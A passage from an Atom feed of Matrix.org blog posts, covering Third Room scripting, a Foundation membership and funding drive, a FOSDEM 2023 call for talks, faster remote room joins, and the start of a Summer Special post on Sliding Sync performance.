&lt;p&gt;We launched &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2022&#x2F;09&#x2F;27&#x2F;announcing-third-room-tech-preview-1&quot;&gt;Tech Preview 1 of Third Room&lt;&#x2F;a&gt; at the end of September, and since then all of the work has been around building out WebSceneGraph and the WASM scripting environment - letting users build their own functionality in JS via QuickJS or C (and in future Rust or Zig too).  We’ve also been working on making the networking (via Matrix WebRTC-negotiated data channels) more robust, switching to an ‘authoritative’ simulation model rather than having each client run its own physics simulation, in order to kick the hard problem of decentralised physics simulations down the road a bit further. We’re also adding in a much-needed ‘discover’ page to help users find new rooms and explore everything that’s possible in the platform.  And finally, we’re adding WebXR support so that folks can use ThirdRoom with VR and AR hardware if they so desire. All this should culminate in Tech Preview 2, due in the coming weeks.&lt;&#x2F;p&gt;
&lt;p&gt;If you want a quick sneak preview of the scripting capabilities on the horizon with a &lt;a href=&quot;https:&#x2F;&#x2F;matrix.thirdroom.io&#x2F;_matrix&#x2F;media&#x2F;r0&#x2F;download&#x2F;thirdroom.io&#x2F;qFfvHcXNQkjeDjTpdMfPCniY&quot;&gt;very basic script&lt;&#x2F;a&gt; stored in the media repository, head over to &lt;a href=&quot;https:&#x2F;&#x2F;thirdroom.io&#x2F;world&#x2F;#surprise:thirdroom.dev&quot;&gt;https:&#x2F;&#x2F;thirdroom.io&#x2F;world&#x2F;#surprise:thirdroom.dev&lt;&#x2F;a&gt; and click on the television ;)&lt;&#x2F;p&gt;
&lt;h3 id=&quot;conclusion&quot;&gt;Conclusion&lt;&#x2F;h3&gt;
&lt;p&gt;So there you have it: it’s been a mixed year for Matrix, but at least the project itself is moving forwards faster than ever, for now. If you look back at the predictions from &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2021&#x2F;12&#x2F;22&#x2F;the-mega-matrix-holiday-special-2021#2022&quot;&gt;last year’s holiday blog post&lt;&#x2F;a&gt; you’ll see that most of them even came true. This year, we’ll keep the predictions simple: our plans for 2023 are to ensure that the Foundation is well funded, ship all of the step-change improvements in performance and usability which are currently in beta as rapidly as possible - and demonstrate for once and for all that Matrix can indeed punch its weight against the proprietary centralised alternatives.&lt;&#x2F;p&gt;
&lt;p&gt;If you can afford it, please consider donating to the Matrix.org Foundation to support our work. The most efficient way to support us is to &lt;a href=&quot;https:&#x2F;&#x2F;donorbox.org&#x2F;keep-matrix-exciting&quot;&gt;donate via donorbox&lt;&#x2F;a&gt;. Our Patreon is not going anywhere, so if you wish to keep supporting it there we&#x27;re happy to count you in our supporters.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;donorbox.org&#x2F;keep-matrix-exciting&quot;&gt;&lt;img src=&quot;&#x2F;images&#x2F;donorbox.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Thanks for flying Matrix;&lt;&#x2F;p&gt;
&lt;p&gt;Matthew, Amandine &amp;amp; the whole core team.&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Funding Matrix via the Matrix.org Foundation</title>
        <published>2022-12-01T00:00:00+00:00</published>
        <updated>2022-12-01T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2022/12/01/funding-matrix-via-the-matrix-org-foundation/" type="text/html"/>
        <id>https://matrix.org/blog/2022/12/01/funding-matrix-via-the-matrix-org-foundation/</id>
        
        <content type="html">&lt;p&gt;&lt;em&gt;TL;DR: you can now officially join the Matrix Foundation as an organisational
or individual member in order to sustainably support core Matrix development,
help steer the direction of the protocol and how best to fund it! Organisations
can join by filling &lt;a href=&quot;https:&#x2F;&#x2F;forms.gle&#x2F;Yy345QkB5pifJJNy6&quot;&gt;this form&lt;&#x2F;a&gt; and we will get back in touch, or individuals can
now donate directly &lt;a href=&quot;https:&#x2F;&#x2F;donorbox.org&#x2F;keep-matrix-exciting&quot;&gt;here&lt;&#x2F;a&gt; (as a more efficient alternative to Patreon, which
remains online for Patrons used to it).&lt;&#x2F;em&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Hi all,&lt;&#x2F;p&gt;
&lt;p&gt;Only two days late for Giving Tuesday (and 4 years late on the Foundation
scale), we are super excited to announce that we are finally expanding the
Matrix Foundation into a fully-fledged non-profit fund-raising organisation to
help support the core Matrix development and the wider open source Matrix
ecosystem!&lt;&#x2F;p&gt;
&lt;p&gt;Has your organisation been using Matrix to communicate via the open source
server and clients and you want to ensure that improvements and features still
keep coming? Become a member, and feed into the roadmap.&lt;&#x2F;p&gt;
&lt;p&gt;Has your company been building on top of Matrix, making the most of its openness
and flexibility, but you’ve never figured out how to contribute back in order
to ensure the resilience of the tech which you rely on for the success of your
business? Become a member, and ensure the core development is funded and that
Matrix is here to thrive.&lt;&#x2F;p&gt;
&lt;p&gt;Are you about to be designated a gatekeeper by the EU, and have to rapidly figure out how to implement &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2022&#x2F;03&#x2F;29&#x2F;how-do-you-implement-interoperability-in-a-dma-world&quot;&gt;DMA-compliant interoperability&lt;&#x2F;a&gt; (complete with end-to-end encryption compatibility) into your services? Become a member, and discover how Matrix can solve all your problems, while providing your input too. &lt;&#x2F;p&gt;
&lt;p&gt;Are you looking to implement DMA interoperability but don&#x27;t fall into the gatekeeper designation? Become a member, and help ensure Matrix fits your needs too!&lt;&#x2F;p&gt;
&lt;p&gt;Are you a non-profit organisation with a mission to provide secure and sovereign communications to those who need it the most, providing an alternative to the current players? Become a member, and help us take our mission forward.&lt;&#x2F;p&gt;
&lt;p&gt;Are you an individual who strongly supports the mission of Matrix and wants to see it thrive and become the open backbone of the world’s communications? Become a member, and support the future of Matrix. &lt;&#x2F;p&gt;
&lt;p&gt;In short, this finally gives the wider world a way to contribute concretely to the significant costs of funding folks to work fulltime on core Matrix development - which now covers over 243(!) projects in &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&quot;&gt;github.com&#x2F;matrix-org&lt;&#x2F;a&gt;. Core Matrix work ranges from: &lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;managing the Matrix spec itself &lt;&#x2F;li&gt;
&lt;li&gt;maintaining the reference client SDKs and encryption and getting them independently audited&lt;&#x2F;li&gt;
&lt;li&gt;maintaining example server implementations in the form of Synapse and Dendrite&lt;&#x2F;li&gt;
&lt;li&gt;writing the test suite&lt;&#x2F;li&gt;
&lt;li&gt;publishing the matrix.org website&lt;&#x2F;li&gt;
&lt;li&gt;promoting awareness of Matrix&lt;&#x2F;li&gt;
&lt;li&gt;running the matrix.org homeserver&lt;&#x2F;li&gt;
&lt;li&gt;and so much more... &lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;In exchange for supporting the Foundation, and beyond providing certainty that our work can continue, organisations and individuals who contribute financially will be able to directly provide input to the trajectory of the core Matrix developments by becoming official members of the Matrix.org Foundation.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;introducing-foundation-memberships-and-the-governing-board&quot;&gt;Introducing Foundation Memberships and the Governing Board&lt;&#x2F;h2&gt;
&lt;p&gt;Practically speaking, this means that we are going to create a &amp;quot;Governing Board&amp;quot; to the Matrix.org Foundation: a new team, made up of members voted by the overall membership, a subset of the Guardians and a subset of the Spec Core Team. The Governing Board will have the responsibility of determining how Foundation funds are distributed and used, how the Spec Core Team roadmap is prioritised, how to best grow Matrix awareness, etc.&lt;&#x2F;p&gt;
&lt;p&gt;In other words, we are literally expanding the day-to-day steering of the direction of the Matrix Foundation to the wider community. In order to run the Governing Board and the overall work of the Foundation, &lt;strong&gt;we are also hiring an Executive Director&lt;&#x2F;strong&gt;, so please get in touch via &lt;a href=&quot;mailto:funding@matrix.org&quot;&gt;funding@matrix.org&lt;&#x2F;a&gt; if you’re a non-profit foundation-running expert! In the interim, while this search proceeds, Matthew and Amandine will fill the role with the support of the other Guardians of Matrix. The Guardians themselves retain their existing function as the Foundation&#x27;s non-executive board - responsible for safeguarding the overall mission of Matrix, appointing the membership of the Spec Core Team, approving membership applications, and defining the overall changes we’re outlining here.&lt;&#x2F;p&gt;
&lt;p&gt;Membership comes at various levels, each with different rewards:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Individual memberships (i.e. today’s Patreon supporters):
&lt;ul&gt;
&lt;li&gt;Ability to vote in the appointment of up to 2 ‘community representatives’ to the Foundation&#x27;s governing board.&lt;&#x2F;li&gt;
&lt;li&gt;Name on the Matrix.org website&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;Silver member: between £2,000 and £80,000 per year, depending on organisation size
&lt;ul&gt;
&lt;li&gt;Ability to vote on the appointment of up to 2 ‘Silver representative’ to the Foundation&#x27;s governing board&lt;&#x2F;li&gt;
&lt;li&gt;Supporter logo on the front page of the new Matrix.org website&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;Gold member: £200,000 &#x2F; year, adds:
&lt;ul&gt;
&lt;li&gt;Ability to vote on the appointment of up to 3 ‘Gold representatives’ to the Foundation&#x27;s governing board.&lt;&#x2F;li&gt;
&lt;li&gt;Press release announcing the sponsorship&lt;&#x2F;li&gt;
&lt;li&gt;1 original post on the Matrix.org blog per year&lt;&#x2F;li&gt;
&lt;li&gt;Participation in the internal Spec Core Team room&lt;&#x2F;li&gt;
&lt;li&gt;Larger logo on the front page of Matrix.org&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;Platinum member: £500,000 &#x2F; year, adds:
&lt;ul&gt;
&lt;li&gt;Ability to vote on the appointment of up to 5 ‘platinum representatives’ to the Foundation&#x27;s governing board.&lt;&#x2F;li&gt;
&lt;li&gt;1 sponsored Matrix Live episode per year&lt;&#x2F;li&gt;
&lt;li&gt;Largest logo on the front page of Matrix.org&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;As the activities of the Foundation increase, we expect to add more benefits to this list, for example discounts on sponsoring a future Matrix Conference, or similar.&lt;&#x2F;p&gt;
&lt;p&gt;Governing Board elections will occur yearly, with the first election planned towards the end of this year once we’ve gathered together the first wave of members and candidates have proposed themselves for election.&lt;&#x2F;p&gt;
&lt;p&gt;For anyone building on Matrix, memberships are a no-brainer as they will ensure the perpetuity and future-proof-ness of the standard. But for anyone supporting the mission of Matrix, this membership can be key to define its future. &lt;&#x2F;p&gt;
&lt;p&gt;Meanwhile, with Matrix looking increasingly integral to implementing interoperable communication for compliance with the EU’s Digital Markets Act (whether that’s as pure Matrix, or as part of the IETF &lt;a href=&quot;https:&#x2F;&#x2F;datatracker.ietf.org&#x2F;doc&#x2F;draft-ralston-mimi-matrix-transport&#x2F;&quot;&gt;MIMI&lt;&#x2F;a&gt; initiative), this is an incredible opportunity for the organisations impacted by DMA to get a front-row seat within the Foundation to ensure that Matrix thrives and solves the challenges posed by the act. To get involved, please apply via the &lt;a href=&quot;https:&#x2F;&#x2F;forms.gle&#x2F;Yy345QkB5pifJJNy6&quot;&gt;membership application form&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;so-why-is-this-all-happening&quot;&gt;So, why is this all happening?&lt;&#x2F;h2&gt;
&lt;p&gt;Since 2017, core Matrix development has been funded primarily by Element - the company founded by the team who created Matrix. Over the years, Element has put tens of millions of dollars into Matrix - which in turn has come from both selling Matrix hosting (EMS), on-premise Matrix solutions, and VC investment in Element. To put it in perspective, even though there are over 5000 contributors to &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&quot;&gt;github.com&#x2F;matrix-org&lt;&#x2F;a&gt; - over 90% of the actual committed lines of code come from Element employees. Similarly, while we are &lt;em&gt;enormously&lt;&#x2F;em&gt; thankful for the past and existing generous donations from the wider Matrix community, today they only come to $6,000 a month, relative to the $400,000 a month that Element has been funding.&lt;&#x2F;p&gt;
&lt;p&gt;Over the last year, we’ve seen a palpable shift within the Matrix ecosystem. Matrix is growing faster than ever. Synapse has improved immeasurably, using less RAM than ever and even sprouting Rust to optimise its hot paths. Element has improved immeasurably too, with an entirely new design on mobile, and tons of new features including threads, voice messages, location share, video rooms and more. Monthly active users reported via Synapse’s phone-home stats have almost doubled and are growing at their fastest ever rate. The number of servers has increased equivalently. We hear about major new commercial Matrix deployments almost every day. However, while usage is going through the roof - we haven’t seen a matching increase in players looking to support the project.&lt;&#x2F;p&gt;
&lt;p&gt;In fact, we’ve seen the opposite: commercial vendors forking the protocol while trying to break up the core team. Matrix tenders lost to “preferred” vendors who know absolutely nothing about Matrix. Vendors selling Matrix hosting or services without contributing anything back to the project at all. Organisations with huge amounts of money (governments, $$B massive enterprises) have enthusiastically launched proprietary Matrix solutions by building on the liberally-licensed Apache reference Matrix implementations… while contributing back nothing. Now, we are enormously grateful for the commercial Matrix deployments who &lt;em&gt;do&lt;&#x2F;em&gt; actually work with Element to fund core development or contribute code themselves - but this is very clearly the minority. Obviously it’s great to see folks building on Matrix - but it’s rather galling if it ends up with insufficient funding trickling down to the core Matrix team to be able to build the foundational technology that everyone else is relying on.&lt;&#x2F;p&gt;
&lt;p&gt;Element in particular has staffed up in order to both support the core Matrix ecosystem (the spec, Synapse, Dendrite, Client SDKs, Encryption implementations etc) as well as Element-specific work (the Element apps, EMS, the Element Enterprise Installer, etc). As a result, Element employs roughly twice as many developers as you might expect, and while Matrix is here to stay, this turns out not to be sustainable for Element unless the wider ecosystem helps support the foundational work&lt;&#x2F;p&gt;
&lt;p&gt;We believe the world needs secure decentralised communication more than ever, and ensuring the Foundation can distribute funding to those contributing to the core platform (be that Element or individuals or other organisations) is key to that. So: please consider this a call to arms - if you believe the world needs Matrix, and particularly if you depend on it for your business, please join the Foundation and participate!&lt;&#x2F;p&gt;
&lt;p&gt;Fill in &lt;a href=&quot;https:&#x2F;&#x2F;forms.gle&#x2F;Yy345QkB5pifJJNy6&quot;&gt;the form&lt;&#x2F;a&gt; to apply for membership, or if you are not acting on behalf of an organisation, you can go straight to our &lt;a href=&quot;https:&#x2F;&#x2F;donorbox.org&#x2F;keep-matrix-exciting&quot;&gt;donation page&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Matthew, Amandine &amp;amp; the whole Matrix.org Foundation&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Call for Participation for the FOSDEM 2023 Matrix Devroom</title>
        <published>2022-11-16T00:00:00+00:00</published>
        <updated>2022-11-16T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2022/11/16/call-for-participation-for-the-fosdem-2023-matrix-devroom/" type="text/html"/>
        <id>https://matrix.org/blog/2022/11/16/call-for-participation-for-the-fosdem-2023-matrix-devroom/</id>
        
        <content type="html">&lt;p&gt;This year, the Matrix.org Foundation is excited to host the first ever
Matrix.org Foundation and Community devroom &lt;em&gt;in person&lt;&#x2F;em&gt; at FOSDEM. Half a day of
talks, demos and workshops around Matrix itself and projects built on top of
Matrix.&lt;&#x2F;p&gt;
&lt;p&gt;We encourage people working on the Matrix protocol or building on it in an open
source project to submit a proposal! Note that companies are welcome to talk
about the Matrix details of their open source projects, but marketing talks are
not welcome.&lt;&#x2F;p&gt;
&lt;p&gt;This call for participation is only about the physical devroom. A separate CfP
will be issued for the online devroom once there are more details about it.&lt;&#x2F;p&gt;
&lt;p&gt;Key dates are:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Conference dates 4-5 February, 2023 In person&lt;&#x2F;li&gt;
&lt;li&gt;Matrix Devroom date: Sunday 5 morning in person, online devroom to be
announced&lt;&#x2F;li&gt;
&lt;li&gt;Submission deadline: Monday 5th December&lt;&#x2F;li&gt;
&lt;li&gt;Announcement of selected talks: Thursday 15th December &lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;You must be available in person to present your talk for the physical devroom.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;talk-details&quot;&gt;Talk Details&lt;&#x2F;h2&gt;
&lt;p&gt;The talks can follow one of thee two formats for the physical devroom&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;20 min talk + 10 min Q&amp;amp;A, for topics that can be covered briefly&lt;&#x2F;li&gt;
&lt;li&gt;50 min talk + 10 min Q&amp;amp;A for more complex subjects which need more focus&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;We strongly encourage you to prepare a demo when it makes sense, so people can 
actually see what your work looks like in practice!&lt;&#x2F;p&gt;
&lt;p&gt;Of course, the proposal must respect the FOSDEM terms as well:&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;The conference language is English. All content must relate to Free and Open
Source Software. By participating in the event you agree to the publication of
your recordings, slides and other content provided under the same licence as
all FOSDEM content (CC-BY).&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h2 id=&quot;submitting-a-proposal&quot;&gt;Submitting a Proposal&lt;&#x2F;h2&gt;
&lt;p&gt;Proposals must be &lt;a href=&quot;https:&#x2F;&#x2F;penta.fosdem.org&#x2F;submission&#x2F;FOSDEM23&quot;&gt;submitted on FOSDEM&#x27;s conference management system Pentabarf&lt;&#x2F;a&gt;
before &lt;del&gt;December 5&lt;&#x2F;del&gt; December 8 2022. If you are not used to Pentabarf, you can
follow this &lt;a href=&quot;https:&#x2F;&#x2F;eyskens.me&#x2F;beginners-guide-to-pentabarf&#x2F;&quot;&gt;beginners guide to Pentabarf&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;We expect to receive more requests than we have slots available. The devroom
organisers will be reviewing the proposals and accepting them based on the
potential positive impact the project has on Matrix (as defined in by the
Mission section of https:&#x2F;&#x2F;matrix.org&#x2F;foundation).&lt;&#x2F;p&gt;
&lt;p&gt;If a project proposal has been turned down, it doesn&#x27;t mean we don&#x27;t believe it
has good potential. Maintainers are invited to join the &lt;a href=&quot;https:&#x2F;&#x2F;matrix.to&#x2F;#&#x2F;#twim:matrix.org&quot;&gt;#twim:matrix.org&lt;&#x2F;a&gt;
Matrix room to give it some visibility.&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Testing faster remote room joins</title>
        <published>2022-10-18T13:35:00+00:00</published>
        <updated>2022-10-18T13:35:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2022/10/18/testing-faster-remote-room-joins/" type="text/html"/>
        <id>https://matrix.org/blog/2022/10/18/testing-faster-remote-room-joins/</id>
        
        <summary type="html">&lt;p&gt;As of &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2022&#x2F;10&#x2F;17&#x2F;synapse-1-69-released&quot;&gt;Synapse 1.69&lt;&#x2F;a&gt;, we consider &amp;quot;faster remote room joins&amp;quot; to be ready for testing by server admins.&lt;&#x2F;p&gt;
&lt;p&gt;There are a number of caveats, which I&#x27;ll come to, but first: this is an important step in a project which we&#x27;ve been working on for 9 months. Most people who use Matrix will be familiar with the pain of joining a large room over federation: typically you are just faced with a spinner, which is eventually replaced by a cryptic error. If you&#x27;re lucky, the room eventually pops up in your room list of its own accord. The whole experience is &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;1211&quot;&gt;one of the longest-standing open issues in Synapse&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
</summary>
        
    </entry>
    <entry xml:lang="en">
        <title>The Matrix Summer Special 2022</title>
        <published>2022-08-15T00:00:00+00:00</published>
        <updated>2022-08-15T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2022/08/15/the-matrix-summer-special-2022/" type="text/html"/>
        <id>https://matrix.org/blog/2022/08/15/the-matrix-summer-special-2022/</id>
        
        <content type="html">&lt;p&gt;Hi all,&lt;&#x2F;p&gt;
&lt;p&gt;At the end of each year it’s been traditional to do a big review of everything that the Matrix core team got up to that year, and announcing our predictions for the next.  You can see the last edition in &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2021&#x2F;12&#x2F;22&#x2F;the-mega-matrix-holiday-special-2021&quot;&gt;2021 here&lt;&#x2F;a&gt; - and if you’re feeling nostalgic you can head down memory lane with the &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2020&#x2F;12&#x2F;25&#x2F;the-matrix-holiday-special-2020&quot;&gt;2020&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2019&#x2F;12&#x2F;24&#x2F;the-2019-matrix-holiday-update&quot;&gt;2019&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2018&#x2F;12&#x2F;25&#x2F;the-2018-matrix-holiday-special&quot;&gt;2018&lt;&#x2F;a&gt; ones etc too.&lt;&#x2F;p&gt;
&lt;p&gt;This year is turning out to be slightly different, however.  Our plans for 2022 are particularly ambitious: to force a step change in improving Matrix’s performance and usability so that we firmly transition from our historical “make it work” and “make it work right” phases into “&lt;strong&gt;making it fast&lt;&#x2F;strong&gt;”.  Specifically: to succeed, Matrix &lt;strong&gt;has&lt;&#x2F;strong&gt; to succeed in powering apps which punch their weight in terms of performance and usability against the proprietary centralised alternatives of WhatsApp, Discord, Slack and friends.&lt;&#x2F;p&gt;
&lt;p&gt;We’ve seen an absolute tonne of work happening on this so far this year… and somehow the end results all seem to be taking concrete shape at roughly the same time, despite summer traditionally being the quietest point of the year.  The progress is super exciting and we don’t want to wait until things are ready to enthuse about them, and so we thought it’d be fun to do a spontaneous Summer Special gala blog post so that everyone can follow along and see how things are going!&lt;&#x2F;p&gt;
&lt;h2 id=&quot;making-it-fast&quot;&gt;Making it fast&lt;&#x2F;h2&gt;
&lt;p&gt;We have always focused on first making Matrix “work right” before we make it “work fast” - sometimes to a fault.  After all: the longer you build on a given architecture the harder it becomes to swap it out down the line, and the core architecture of Matrix has remained essentially the same since we began in 2014 - frankly it’s amazing that the initial design has lasted for as long as it has.&lt;&#x2F;p&gt;
&lt;p&gt;Over the years we’ve done a lot of optimisation work on the core team implementations of that original architecture - whether that’s Synapse or matrix-{js,react,ios,android}-sdk and friends: for instance Synapse uses 5-10x less RAM than it used to (my personal federated server is only using 145MB of RAM atm! 🤯) and it continues to speed up in pretty much every new release (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;13522&quot;&gt;this PR&lt;&#x2F;a&gt; looks to give a 1000x speedup on calculating push notification actions, for instance!).  However, there are some places where Matrix’s architecture itself ends up being an embarrassingly slow bottleneck: most notably when rapidly syncing data to clients, and when joining rooms for the first time over federation.  We’re addressing these as follows…&lt;&#x2F;p&gt;
&lt;h3 id=&quot;sliding-sync-aka-sync-v3&quot;&gt;Sliding Sync (aka Sync v3)&lt;&#x2F;h3&gt;
&lt;p&gt;Historically, &#x2F;sync always assumed that the client would typically want to know about all the conversations its user is in - much as an IRC client or XMPP client is aware of all your current conversations.  This provided some nice properties - such as automatically enabling perfect offline support, simplifying client and server development, and making features like “jump to room” and “tab complete” work instantly given the data is all client-side.  In the early days of Matrix, when nobody was yet a power user, this wasn’t really a problem - but as users join more conversations and join bigger rooms, it’s become one of Matrix’s biggest performance bottlenecks.  In practice, logging into a large account (~4000 rooms) can take ~10 minutes and hundreds of megabytes of network traffic, which is clearly ridiculous. Worse: if you go offline for a day or so, the incremental sync to catch back up can take minutes to calculate (and can even end up being worse than an initial sync).&lt;&#x2F;p&gt;
&lt;p&gt;To fix this, we started work on Sliding Sync (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-spec-proposals&#x2F;blob&#x2F;kegan&#x2F;sync-v3&#x2F;proposals&#x2F;3575-sync.md&quot;&gt;MSC3575&lt;&#x2F;a&gt;) in 2021: a complete reimagining of the &#x2F;sync API used by Matrix clients to receive data from their homeserver.  In Sliding Sync, we only send the client the data it needs to render its UI.  Most importantly, we only tell it about the subset of rooms which it is visible in the scroll window of its room list (or that it needs to display notifications about).  As the user scrolls around the room list, they slide the window up and down - hence the name “sliding sync”.  Sliding Sync was originally called Sync v3, given it’s our 3rd iteration of the sync API - it got renamed Sliding Sync given the current sync API confusingly ended up with a prefix of &#x2F;v3.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2021&#x2F;12&#x2F;22&#x2F;the-mega-matrix-holiday-special-2021#sync-v3&quot;&gt;Back in December&lt;&#x2F;a&gt; our work on Sliding Sync was still pretty early: we had the initial MSC, an experimental proxy that converted the existing sync v2 API into Sliding Sync, and a simple proof-of-concept web client to exercise it.  Since then, however, there has been spectacular progress:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;MSC3575 has undergone some &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-spec-proposals&#x2F;pull&#x2F;3575&#x2F;commits&#x2F;bea7323c0b03dbd46600ce8fe01218d55f0de083&quot;&gt;big&lt;&#x2F;a&gt; &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-spec-proposals&#x2F;pull&#x2F;3575&#x2F;commits&#x2F;a0bf4027bcef278e43a570c6fa94f2b1bef3488b&quot;&gt;iterations&lt;&#x2F;a&gt; as we converge on the optimal API shape.&lt;&#x2F;li&gt;
&lt;li&gt;The &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;sliding-sync&quot;&gt;sliding-sync&lt;&#x2F;a&gt; proxy has matured to be something which we’re now running in stealth against matrix.org for those dogfooding the API&lt;&#x2F;li&gt;
&lt;li&gt;We added the concept of extensions to split out how to sync particular classes of data (to avoid the API becoming a monolithic monster) - specifically:
&lt;ul&gt;
&lt;li&gt;Account Data&lt;&#x2F;li&gt;
&lt;li&gt;End-to-end Encryption&lt;&#x2F;li&gt;
&lt;li&gt;To-device messages&lt;&#x2F;li&gt;
&lt;li&gt;Ephemeral events (to be done)&lt;&#x2F;li&gt;
&lt;li&gt;Presence (to be done)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;We added support for spaces!&lt;&#x2F;li&gt;
&lt;li&gt;We implemented it in &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-js-sdk&#x2F;pull&#x2F;2242&quot;&gt;matrix-js-sdk&lt;&#x2F;a&gt; (which merged a few weeks ago!)&lt;&#x2F;li&gt;
&lt;li&gt;…and have a WIP implementation in &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-rust-sdk&#x2F;pull&#x2F;728&quot;&gt;matrix-rust-sdk&lt;&#x2F;a&gt; too.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;But most importantly, we’ve also been busy implementing Sliding Sync in Element Web itself so we can start using it for real.  Now, this is still a work in progress, but as of today it’s &lt;em&gt;just&lt;&#x2F;em&gt; getting to the point where one can experiment with it as a daily driver (although it’s definitely alpha and we’re still squishing bugs like crazy!) - and we can see just how well it really performs in real life.&lt;&#x2F;p&gt;
&lt;p&gt;For instance, here’s a video of my account (4055 rooms, redacted for privacy) logging in on an entirely fresh browser via Sliding Sync - the actual sync takes roughly 1 second (at 00:18 in the video).  And if we’d started the sync operation while the user is setting up E2E encryption, it would have completed in the background before they even got to the main screen, giving instant login(!).  Given my account typically takes ~10 minutes to initial sync (plus even more time for encryption to sync up), this is at least a real-life &lt;strong&gt;600x improvement&lt;&#x2F;strong&gt;.  Moreover, the sync response is only 20KB (a ~5000x improvement) - a huge win for low-bandwidth Matrix situations.&lt;&#x2F;p&gt;
&lt;iframe src=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;embed&#x2F;9dbM66tGK5s&quot; title=&quot;Sliding Sync Demo&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen&gt;&lt;&#x2F;iframe&gt;
&lt;p&gt;Then, having logged in, the client subsequently launches pretty much instantly, &lt;em&gt;no matter how long you’ve been offline&lt;&#x2F;em&gt;. Total launch time is roughly 4 seconds, most of which is loading the app’s assets - which in turn could well be improved by progressively loading the app.  It could also be sped up even more if we cached state locally - currently the implementation simply reloads from the server every time the app launches rather than maintaining a local cache.&lt;&#x2F;p&gt;
&lt;p&gt;As you can see, this is palpably coming together, but there’s still a bunch of work to be done before we can encourage folks to try it, including:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Switching the RoomList to be fully backed by sliding sync (currently the v2 roomlist is jury-rigged up to the sliding sync API, causing some flakey bugs such as duplicate rooms)&lt;&#x2F;li&gt;
&lt;li&gt;Spec and hook up typing &#x2F; receipts &#x2F; presence extensions&lt;&#x2F;li&gt;
&lt;li&gt;Hook up favourites, low_priority, knocked and historical rooms&lt;&#x2F;li&gt;
&lt;li&gt;Adding back in loading room members&lt;&#x2F;li&gt;
&lt;li&gt;Apply quality-of-service to to-device messages so we prioritise ones relevant to the current sliding window&lt;&#x2F;li&gt;
